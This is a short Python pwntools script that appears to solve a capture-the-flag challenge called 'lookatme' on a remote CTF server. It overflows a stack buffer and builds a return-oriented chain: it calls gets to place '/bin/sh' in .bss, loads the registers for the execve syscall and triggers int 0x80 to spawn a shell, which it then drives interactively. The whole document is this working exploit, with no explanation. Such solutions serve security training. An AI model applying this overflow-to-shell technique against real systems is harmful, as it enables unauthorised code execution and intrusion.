from pwn import *

#p=process('./lookatme')
#p=gdb.debug('./lookatme','break look_at_me')
p=remote('ctf.j0n9hyun.xyz','3017')

int80 = 0x806cc25
bss=0x80eaf80
gets=0x804f120
p_ebx=0x80583c1
p_eax=0x80b81c6
p_ecx=0x80de955

payload='a'*(0x18+4)+p32(gets)+p32(p_ebx)+p32(bss)+p32(p_eax)+p32(11)+p32(p_ecx)+p32(0)+p32(int80)

p.recvline()
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
p.close()
